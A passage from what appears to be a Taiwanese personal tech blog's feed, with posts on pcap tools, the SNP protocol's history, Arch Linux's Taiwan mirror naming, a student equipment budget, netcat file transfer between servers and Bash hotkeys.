&lt;li&gt;&lt;code&gt;$ tcpxtract -f ${pcap_file} -o {output_path}&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;References&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://serverfault.com/questions/38626/how-can-i-read-pcap-files-in-a-friendly-format"&gt;serverfault - How can I read pcap files in a friendly format?&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://sickbits.net/other/pcapworksheet.txt"&gt;Hack3rcon^3: A PCAP Workshop&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="CLI"></category><category term="WireShark"></category><category term="pcap"></category><category term="tcpdump"></category><category term="tcpick"></category><category term="tcpxtract"></category></entry><entry><title>SNP (Secure Network Protocol)</title><link href="https://blog.m157q.tw/posts/2014/11/03/snp-secure-network-protocol/" rel="alternate"></link><published>2015-10-20T14:07:00+08:00</published><updated>2015-10-20T14:07:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-11-03:posts/2014/11/03/snp-secure-network-protocol/</id><summary type="html">&lt;p&gt;交大 DSNS Lab 開發&lt;br /&gt;
有申請專利&lt;br /&gt;
看起來就是個有加密的 telnet (?)&lt;br /&gt;
聽說後來沒人維護，就被 SSH 幹掉了&lt;br /&gt;
又知道了奇怪的歷史&lt;br /&gt;
以前的人都好強啊  &lt;/p&gt;
&lt;p&gt;&lt;a href="http://toget.pchome.com.tw/category/network/11685.html"&gt;SNP telnet for Windows 給你安全的 telnet 環境 - PChome 下載&lt;/a&gt;&lt;br /&gt;
這邊還有相關軟體可以下載得到(?)  &lt;/p&gt;
&lt;p&gt;Quote from &lt;a href="http://www.ascc.sinica.edu.tw/nl/88/1517/02.txt"&gt;《網路與通訊》 淺談網路安全與防護&lt;/a&gt;  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;3.SNP：&lt;br /&gt;
由交通大學資訊工程學系分散系統與網路安全實驗室所研發出來的一套新式網路安全系統&lt;br /&gt;
（Security  Network Protocols， 簡稱SNP）。&lt;br /&gt;
此套系統包含了多項安全的應用程式，&lt;br /&gt;
如安全電子郵件（Certified  Secure E-mail System，簡稱CS-Mail）、&lt;br /&gt;
身分認證中心（Certificate Authority）及&lt;br /&gt;
網路監聽系統（Network Monitor Systems）等&lt;br /&gt;
交大係冀望藉由此一系統的功能，達到整合式的安全通訊網路環境。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Quote from &lt;a href="https://ir.nctu.edu.tw/bitstream/11536/6497/1/000272742700008.pdf"&gt;https://ir.nctu.edu.tw/bitstream/11536/6497/1/000272742700008.pdf&lt;/a&gt;  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Among these protocols, Secure Network Protocol (SNP)(Shieh et al., 1999)&lt;br /&gt;
is one of the few protocols that has real deployment for years.&lt;br /&gt;
SNP is a symmetric-key based protocol providing an efficient way for both intra- and inter- domain authentication.&lt;br /&gt;
Compared  to  Kerberos, fewer messages are required in SNP to authenticate client identity.&lt;br /&gt;
For intra-domain authentication,&lt;br /&gt;
SNP takes four messages to authenticate client identity and one more optional message for mutually authenticating the server.&lt;br /&gt;
For inter-domain authentication, it takes seven messages for initial authentication,&lt;br /&gt;
regardless of the number of hops between the visited and home domains.&lt;br /&gt;
Only two messages are required for subsequent authentication when requesting the same service.&lt;br /&gt;
To simplify the design, SNP replaces timestamps with nonces, reducing the need for time servers.&lt;br /&gt;
For faster authentication, a master key is shared by the authentication server (AS) and the service servers (S).&lt;br /&gt;
The unchanged master keys can make the system vulnerable to various attacks.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Quote from &lt;a href="https://comm.ntu.edu.tw/2010UKworkshop/NSP9.htm"&gt;Prof. Shiuhpyng Shieh&lt;/a&gt;  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;He was the designer of SNP (Secure Network Protocol), which was a very popular security software package.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;這篇疑似是 Secure Network Protocol 的論文&lt;br /&gt;
&lt;a href="http://dsns.cs.nctu.edu.tw/ssp/paper/50.An%20Authentication%20and%20Key%20Distribution%20System%20for%20Open%20Network%20Systems.pdf"&gt;http://dsns.cs.nctu.edu.tw/ssp/paper/50.An%20Authentication%20and%20Key%20Distribution%20System%20for%20Open%20Network%20Systems.pdf&lt;/a&gt;  &lt;/p&gt;
&lt;h2&gt;References&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://dsns.cs.nctu.edu.tw/ssp/paper/50.An%20Authentication%20and%20Key%20Distribution%20System%20for%20Open%20Network%20Systems.pdf"&gt;http://dsns.cs.nctu.edu.tw/ssp/paper/50.An%20Authentication%20and%20Key%20Distribution%20System%20for%20Open%20Network%20Systems.pdf&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://ir.nctu.edu.tw/bitstream/11536/6497/1/000272742700008.pdf"&gt;https://ir.nctu.edu.tw/bitstream/11536/6497/1/000272742700008.pdf&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://comm.ntu.edu.tw/2010UKworkshop/NSP9.htm"&gt;Prof. Shiuhpyng Shieh&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.slidefinder.net/c/conventional_encryption/32524394"&gt;netsec-intro-2nd&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://content.edu.tw/senior/computer/ks_ks/pro/new8.htm"&gt;BSD簡介 - SNP &amp;amp; ptelnet&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://toget.pchome.com.tw/category/network/11685.html"&gt;SNP telnet for Windows 給你安全的 telnet 環境 - PChome 下載&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;(dead) &lt;a href="http://fanqiang.chinaunix.net/a1/b2/20020308/060200125_b.html"&gt;FreeBSD SNP 1.裝設SNP&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;(backup) &lt;a href="https://www.evernote.com/shard/s351/sh/18196c4c-a29c-4b39-a114-78991a799f26/908d2e28eaaced87bc50f9bd05b6dfd3"&gt;[備份] 安裝 SNP 通訊全程加密&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;(dead) &lt;a href="http://www.ascc.sinica.edu.tw/nl/88/1517/02.txt"&gt;《網路與通訊》 淺談網路安全與防護&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;(backup) &lt;a href="https://www.evernote.com/shard/s351/sh/889e26f1-362e-4785-b24a-1c5a71b9e2a3/a0a3c0e63b30a4c442d232fb34b37fca"&gt;[備份] 《網路與通訊》淺談網路安全與防護&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="SNP"></category><category term="NCTU"></category><category term="DSNS"></category></entry><entry><title>pacman mirrorlist - Taiwan vs. Taiwan (Province of China)</title><link href="https://blog.m157q.tw/posts/2014/10/29/pacman-mirrorlist-taiwan-vs-taiwan-province-of-china/" rel="alternate"></link><published>2015-10-27T12:55:00+08:00</published><updated>2015-10-27T12:55:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-10-29:posts/2014/10/29/pacman-mirrorlist-taiwan-vs-taiwan-province-of-china/</id><summary type="html">&lt;p&gt;這是個有點久以前的故事了  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://projects.archlinux.org/svntogit/packages.git/commit/trunk?h=packages/pacman-mirrorlist&amp;amp;id=4ebeb6161b4f178b9f3105d47a2c408bc1dd9547"&gt;2012/06/26 的 pacman mirrorlist commit&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;把 Taiwan 改成了 Taiwan (Province of China)  &lt;/p&gt;
&lt;p&gt;然後就有台灣人在 Arch Bugs Report 發起一則 Bug Report  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://bugs.archlinux.org/task/30444"&gt;FS#30444 - Download Page uses Taiwan's name as “Taiwan, Province of China”&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;要求把名字改回 Taiwan  &lt;/p&gt;
&lt;p&gt;陸陸續續也有人去發 Bug Report 要求正名  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://bugs.archlinux.org/task/35586"&gt;FS#35586 - Please change "Taiwan, province of china" to "Taiwan in pacman-mirrorlist&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://bugs.archlinux.org/task/35757"&gt;FS#35757 - Listing for Taiwan&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://bugs.archlinux.org/task/37973"&gt;FS#37973 - Taiwan is not a province of China...&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;然後之後就被 Admin 拿 &lt;a href="http://en.wikipedia.org/wiki/ISO_3166"&gt;ISO 3166&lt;/a&gt; 打槍  &lt;/p&gt;
&lt;p&gt;&lt;img alt="ISO 3166" src="/files/pacman-mirrorlist-taiwan-vs-taiwan-province-of-china/iso_3166.png" /&gt;  &lt;/p&gt;
&lt;p&gt;把相關所有 Report 都 close 掉  &lt;/p&gt;
&lt;p&gt;直到剛剛&lt;br /&gt;
下個 &lt;code&gt;sudo pacman -Syu&lt;/code&gt; 更新 Arch，再用 &lt;code&gt;sudo pacdiff&lt;/code&gt; 更新設定檔的時候&lt;br /&gt;
發現從 Taiwan (Province of China) 改回 Taiwan 了  &lt;/p&gt;
&lt;p&gt;&lt;img alt="Change Back to Taiwan" src="/files/pacman-mirrorlist-taiwan-vs-taiwan-province-of-china/change_back_to_taiwan.png" /&gt;  &lt;/p&gt;
&lt;p&gt;覺得有點訝異和好奇&lt;br /&gt;
查了下官網也沒啥相關公告&lt;br /&gt;
然後去翻了一下&lt;a href="https://projects.archlinux.org/svntogit/packages.git/commit/?h=packages/pacman-mirrorlist&amp;amp;id=6438bca958924f781d166c2a473abecd3db54670"&gt;最新的 commit log&lt;/a&gt;&lt;br /&gt;
和舊的比較一下&lt;br /&gt;
發現是同一個 committer  &lt;/p&gt;
&lt;p&gt;&lt;img alt="Same Committer" src="/files/pacman-mirrorlist-taiwan-vs-taiwan-province-of-china/same_committer.png" /&gt;&lt;br /&gt;
再去看了一下 &lt;a href="https://www.archlinux.org/download/"&gt;Arch Linux 官網的 Download Page&lt;/a&gt;&lt;br /&gt;
台灣的部分還真的改回來變成 Taiwan 了  &lt;/p&gt;
&lt;p&gt;&lt;img alt="Taiwan" src="/files/pacman-mirrorlist-taiwan-vs-taiwan-province-of-china/taiwan.png" /&gt;  &lt;/p&gt;
&lt;p&gt;於是又去找了一下 &lt;a href="http://webcache.googleusercontent.com/search?q=cache:nsRN9P-SvTgJ:https://www.archlinux.org/download/+&amp;amp;cd=1&amp;amp;hl=en&amp;amp;ct=clnk&amp;amp;gl=tw"&gt;Google Cache&lt;/a&gt; 確認一下是不是最近發生的事&lt;br /&gt;
發現還是舊的 Taiwan (Province of China)  &lt;/p&gt;
&lt;p&gt;&lt;img alt="Province of China" src="/files/pacman-mirrorlist-taiwan-vs-taiwan-province-of-china/province_of_china.png" /&gt;  &lt;/p&gt;
&lt;p&gt;所以就確定是最近發生的事了  &lt;/p&gt;
&lt;p&gt;不過我不太清楚改回來的原因是啥&lt;br /&gt;
（其實我也不知道當初被從 Taiwan 改成 Taiwan (Province of China) 的原因）&lt;br /&gt;
發個&lt;a href="http://www.plurk.com/p/ki0evh"&gt;噗浪狀態&lt;/a&gt;後就有人跑去要求 &lt;a href="https://bugs.archlinux.org/task/30444#actionbuttons"&gt;re-open&lt;/a&gt; 了 囧  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;2014-10-29: A request to re-open the task has been made. Reason for request: ISO claimed that the country name is not part of the ISO 3166 standard, thus it's still a WONTFIX for the upstream, ArchLinux is responsible for the issue for regarding something not-in-fact-in-a-standard as standard, thus request re-open. Falling back to the complex procedure of finding country names &lt;em&gt;least&lt;/em&gt; irritating for everyone is both sane and required.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img alt="Re-open" src="/files/pacman-mirrorlist-taiwan-vs-taiwan-province-of-china/re_open.png" /&gt;  &lt;/p&gt;
&lt;p&gt;且看這次會如何回應吧?  &lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;Reference&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://planykao.blogspot.tw/2012/07/taiwan-is-not-province-of-china.html"&gt;http://planykao.blogspot.tw/2012/07/taiwan-is-not-province-of-china.html&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Linux"></category><category term="Taiwan"></category><category term="Arch Linux"></category><category term="pacman"></category><category term="mirrorlist"></category></entry><entry><title>[Life] 專題經費花費計劃</title><link href="https://blog.m157q.tw/posts/2014/10/28/life-zhuan-ti-jing-fei-hua-fei-ji-hua/" rel="alternate"></link><published>2014-10-28T09:12:00+08:00</published><updated>2014-10-28T09:12:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-10-28:posts/2014/10/28/life-zhuan-ti-jing-fei-hua-fei-ji-hua/</id><summary type="html">&lt;h3&gt;前情提要&lt;/h3&gt;
&lt;p&gt;國科會專題經費有 NTD 15,000 可花&lt;br /&gt;
之前為了存 Crawler 去網路上爬下來的 Apk 檔&lt;br /&gt;
花了 NTD 3,500 買了一顆 3TB 的硬碟&lt;br /&gt;
所以跟 Partner 還各有 (15000-3500)/2 = NTD 5,750 可花&lt;br /&gt;
然後 Lab 助理說 NTD 4,000 以上要貼 Lab 的財產標簽&lt;br /&gt;
之後專題結束得歸還給 Lab，不能帶走。&lt;br /&gt;
然後可以用於購買 3C 耗材/設備、文具、書籍  &lt;/p&gt;
&lt;!--more--&gt;

&lt;h3&gt;規則&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;總共只有 NTD 5,750 可花  &lt;/li&gt;
&lt;li&gt;物品單價不能為 NTD 4,000 以上，不然無法帶走  &lt;/li&gt;
&lt;li&gt;只能是 3C 耗材/設備、文具、書籍  &lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;計劃&lt;/h3&gt;
&lt;h4&gt;機械式鍵盤&lt;/h4&gt;
&lt;p&gt;青軸最高&lt;br /&gt;
而且目前就有一把 108 keys Standard Size 的青軸了&lt;br /&gt;
所以想挑方便攜帶為主的，故 60% 為優先（發現台灣賣的真的是很少Orz）&lt;br /&gt;
而且 60% 鍵盤的 Esc 相對於 80% 鍵盤來說&lt;br /&gt;
距離左手小指實在近很多&lt;br /&gt;
對於 Vim 的慣用者實在是差蠻多的&lt;br /&gt;
左手不需要大幅度的移動去按 Esc&lt;br /&gt;
有沒有獨立方向鍵對我來說應該沒大太差別&lt;br /&gt;
其實會比較希望可以不要有獨立方向鍵&lt;br /&gt;
（和其他人不同，大部份都是為了看PTT需要獨立方向鍵）&lt;br /&gt;
這樣右手就不需要大幅度地移動&lt;br /&gt;
最好是能夠按個 Fn/Ctrl + h/j/k/l 就達到方向鍵功能&lt;br /&gt;
再來是如果有無線更好(不過後來發現只有 MILINA Air 而且超出 4000 Orz)&lt;br /&gt;
有以下候選名單  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href="http://www.filco.com.tw/shopProdDetail.asp?id=83"&gt;Filco MINILA Air&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;NTD 4,500 =&amp;gt; 超過 NTD 4,000  &lt;/li&gt;
&lt;li&gt;藍牙無線  &lt;/li&gt;
&lt;li&gt;有獨立方向鍵  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.filco.com.tw/shopProdDetail.asp?id=43"&gt;Filco MINILA&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;NTD 4,000 =&amp;gt; 價錢剛好，很尷尬  &lt;/li&gt;
&lt;li&gt;有獨立方向鍵  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;KBC Poker II (找無官網)  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://search.taobao.com/search?spm=a230r.1.8.6.8EyuMQ&amp;amp;sort=price-asc&amp;amp;tab=all&amp;amp;q=kbc+poker#mainsrp-related"&gt;約 RMB 529 == NTD 2,629 (淘寶含運)&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;無獨立方向鍵  &lt;/li&gt;
&lt;li&gt;PBT 鍵帽  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://shop.cool3c.com/node/292"&gt;KBT Pure Pro&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;NTD 2,590 + 160(運費) == NTD 2,750  &lt;/li&gt;
&lt;li&gt;有獨立方向鍵  &lt;/li&gt;
&lt;li&gt;PBT 鍵帽  &lt;/li&gt;
&lt;li&gt;可程式化自訂按鍵  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.duckychannel.com.tw/tw/ducky-mini/"&gt;Ducky Mini&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;官網沒看到價錢，&lt;a href="http://24h.pchome.com.tw/?mod=store&amp;amp;func=style_show&amp;amp;SR_NO=DCAH8Q"&gt;PChome 看到 NTD 3,090&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;無獨立方向鍵  &lt;/li&gt;
&lt;li&gt;炫砲背光  &lt;/li&gt;
&lt;li&gt;可程式化自訂按鍵  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;MINILA Air 跟 MINILA 超出預算、&lt;br /&gt;
Poker II 得用淘寶訂覺得麻煩然後不太相信對岸(?)、&lt;br /&gt;
Ducky Mini 太炫砲，不是很喜歡。&lt;br /&gt;
所以就決定買 KBT Pure Pro 吧&lt;br /&gt;
67keys, 獨立方向鍵, PBT鍵帽&lt;br /&gt;
不知道有了獨立方向鍵是不是還可以透過特殊功能鍵達到方向鍵功能&lt;br /&gt;
實在不是很想讓右手動來動去&lt;br /&gt;
唯一是怕 USB 接孔在前方，接筆電用不知道會不會卡到  &lt;/p&gt;
&lt;h4&gt;Raspberry Pi&lt;/h4&gt;
&lt;p&gt;應該就買目前最新的 &lt;a href="http://twcn.rs-online.com/web/c/?searchTerm=raspberry_pi_boards_10_14_tw02&amp;amp;searchType=Offers#products"&gt;B+ model&lt;/a&gt; 吧?&lt;br /&gt;
一個才 NTD 1,180 還免運  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;結果官網購買有點麻煩&lt;br /&gt;
還是直接跑去 NOVA 買了&lt;br /&gt;
NTD 1,490&lt;br /&gt;
再加上 USB 轉 MicroUSB 線 NTD 209&lt;br /&gt;
和 32GB micro SD card NTD 399  &lt;/p&gt;
&lt;h4&gt;Arduino&lt;/h4&gt;
&lt;p&gt;雖然官網好像比較便宜 780 + 30&lt;br /&gt;
不過要用購物車還得註冊帳號 實在覺得麻煩&lt;br /&gt;
所以乾脆挑 PChome 通路 貴一點點而已&lt;br /&gt;
考慮只先買個 &lt;a href="http://www.pcstore.com.tw/playrobot/M09742637.htm"&gt;UNO&lt;/a&gt; 來玩玩就好&lt;br /&gt;
一個 NTD 819 加購 USB 傳輸線(NTD 32)也才 NTD 851  &lt;/p&gt;
&lt;h3&gt;花費結算&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align="left"&gt;項目&lt;/th&gt;
&lt;th align="center"&gt;價錢&lt;/th&gt;
&lt;th align="center"&gt;運費/配件&lt;/th&gt;
&lt;th align="center"&gt;總價&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align="left"&gt;~~KBT Pure Pro~~&lt;/td&gt;
&lt;td align="center"&gt;~~2590~~&lt;/td&gt;
&lt;td align="center"&gt;~~160~~&lt;/td&gt;
&lt;td align="center"&gt;~~2750~~&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="left"&gt;Raspberry Pi B+&lt;/td&gt;
&lt;td align="center"&gt;1490&lt;/td&gt;
&lt;td align="center"&gt;0&lt;/td&gt;
&lt;td align="center"&gt;1490&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="left"&gt;32GB micro SD&lt;/td&gt;
&lt;td align="center"&gt;399&lt;/td&gt;
&lt;td align="center"&gt;0&lt;/td&gt;
&lt;td align="center"&gt;399&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="left"&gt;USB to micro USB&lt;/td&gt;
&lt;td align="center"&gt;209&lt;/td&gt;
&lt;td align="center"&gt;0&lt;/td&gt;
&lt;td align="center"&gt;209&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="left"&gt;Arduino UNO&lt;/td&gt;
&lt;td align="center"&gt;819&lt;/td&gt;
&lt;td align="center"&gt;0/32 (USB)&lt;/td&gt;
&lt;td align="center"&gt;851&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="left"&gt;若水堂圖書&lt;/td&gt;
&lt;td align="center"&gt;2758&lt;/td&gt;
&lt;td align="center"&gt;0&lt;/td&gt;
&lt;td align="center"&gt;2758&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;code&gt;5750 - (2758 + 1490 + 399 + 209 + 851)  
= 5750 - 5707  
= 43&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;結果鍵盤沒得開統編&lt;br /&gt;
只好把錢拿去買書了  &lt;/p&gt;</summary><category term="Life"></category><category term="keyboard"></category><category term="arduino"></category><category term="raspberrypi"></category><category term="KBTPurePro"></category></entry><entry><title>防拷貝 DVD 光碟燒錄</title><link href="https://blog.m157q.tw/posts/2014/10/28/how-to-copy-the-copy-protected-dvd-on-windows/" rel="alternate"></link><published>2015-10-28T15:30:00+08:00</published><updated>2015-10-28T15:30:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-10-28:posts/2014/10/28/how-to-copy-the-copy-protected-dvd-on-windows/</id><summary type="html">&lt;p&gt;在 FB 被妹子問  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;「要怎麼拷貝有防拷機制的 DVD？」&lt;br /&gt;
「要怎麼知道光碟機有沒有燒錄功能？」  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;自己也沒弄過，而且現在 DVD 的需求也很低了吧？&lt;br /&gt;
姑且當個好人幫她 Google 一下，記錄起來。  &lt;/p&gt;
&lt;hr /&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://briian.com/tag/%E7%A0%B4%E9%98%B2%E6%8B%B7"&gt;重灌狂人 - 破防拷&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;裡面有蠻多文章提供做法與可用的軟體  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://tw.knowledge.yahoo.com/question/question?qid=1012012901953"&gt;光碟機與燒錄機如何分辨&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;一般來說不要太舊的光碟機應該是都直接就有燒錄功能了啦... 燒錄機真的是很短暫時代的產物...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;燒錄機機身會顯示 CD R/RW 或 DVD R/RW&lt;br /&gt;
光碟機機身會顯示 CD ROM 或 DVD ROM  &lt;/p&gt;
&lt;/blockquote&gt;</summary><category term="DVD"></category><category term="Windows"></category><category term="Copy Protected"></category></entry><entry><title>Simple File Transmission by using Netcat</title><link href="https://blog.m157q.tw/posts/2014/10/22/simple-file-transmission-by-using-netcat/" rel="alternate"></link><published>2015-10-28T13:57:00+08:00</published><updated>2015-10-28T13:57:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-10-22:posts/2014/10/22/simple-file-transmission-by-using-netcat/</id><summary type="html">&lt;h2&gt;Scenario&lt;/h2&gt;
&lt;p&gt;把檔案從 Server A (傳送方) 傳到 Server B (接收方)&lt;br /&gt;
B(接收方)先用 &lt;code&gt;nc&lt;/code&gt; 把 port 打開&lt;br /&gt;
下面的 &lt;code&gt;$TARGETSERVER&lt;/code&gt; 指的就是 B 的 ip&lt;br /&gt;
A(傳送方)再丟檔案過去  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;不用打包的話 （單一檔案）&lt;/h3&gt;
&lt;p&gt;B : &lt;code&gt;nc -l $PORT &amp;gt; $FILENAME&lt;/code&gt;&lt;br /&gt;
A : &lt;code&gt;cat $FILENAME | nc $TARGETSERVER $PORT&lt;/code&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;如果需要打包的話 （資料夾）&lt;/h3&gt;
&lt;p&gt;以 .tar 為例  &lt;/p&gt;
&lt;p&gt;B : &lt;code&gt;nc -l $PORT | tar xvf -&lt;/code&gt;  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;從 &lt;code&gt;stdin&lt;/code&gt; 收到後直接解開成資料夾  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;A : &lt;code&gt;tar cvf - $DIRNAME | nc $TARGETSERVER $PORT&lt;/code&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h4&gt;如果傳到B後不想直接解開&lt;/h4&gt;
&lt;p&gt;ex: 想放在 &lt;code&gt;/usr/ports/distfiles&lt;/code&gt; 裏面  &lt;/p&gt;
&lt;p&gt;B : &lt;code&gt;nc -l $PORT &amp;gt; $DIRNAME.tar&lt;/code&gt;  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;收到後直接變成 &lt;code&gt;.tar&lt;/code&gt; 檔  &lt;/p&gt;
&lt;/blockquote&gt;</summary><category term="CLI"></category><category term="NetCat"></category><category term="nc"></category></entry><entry><title>Bash Cheat Sheet</title><link href="https://blog.m157q.tw/posts/2014/10/16/bash-cheat-sheet/" rel="alternate"></link><published>2015-10-28T14:17:00+08:00</published><updated>2015-10-28T14:17:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-10-16:posts/2014/10/16/bash-cheat-sheet/</id><summary type="html">&lt;h1&gt;Bash Hotkey Cheat Sheet&lt;/h1&gt;
&lt;!--more--&gt;

&lt;h2&gt;Moving the cursor&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Hotkey&lt;/th&gt;
&lt;th&gt;Detail&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Ctrl + a&lt;/td&gt;
&lt;td&gt;Go to the beginning of the line (Home)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Ctrl + e&lt;/td&gt;
&lt;td&gt;Go to the End of the line (End)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Ctrl + p&lt;/td&gt;
&lt;td&gt;Previous command (Up arrow)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Ctrl + n&lt;/td&gt;
&lt;td&gt;Next command (Down arrow)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Alt + b&lt;/td&gt;
&lt;td&gt;Back (left) one word&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Alt + f&lt;/td&gt;
&lt;td&gt;Forward (right) one word&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Ctrl + f&lt;/td&gt;
&lt;td&gt;Forward one character&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Ctrl + b&lt;/td&gt;
&lt;td&gt;Backward one character&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Ctrl + xx&lt;/td&gt;
&lt;td&gt;Toggle between the start of line and current cursor position&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2&gt;Editing&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Hotkey&lt;/th&gt;
&lt;th&gt;Detail&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Ctrl + L&lt;/td&gt;
&lt;td&gt;Clear the Screen, similar to the clear command&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Ctrl + u&lt;/td&gt;
&lt;td&gt;Cut/delete the line before the cursor position.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Alt + Del&lt;/td&gt;
&lt;td&gt;Delete the Word before the cursor.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Alt + d&lt;/td&gt;
&lt;td&gt;Delete the Word after the cursor.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Ctrl + d&lt;/td&gt;
&lt;td&gt;Delete character under the cursor&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Ctrl + h&lt;/td&gt;
&lt;td&gt;Delete character before the cursor (Backspace)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Ctrl + w&lt;/td&gt;
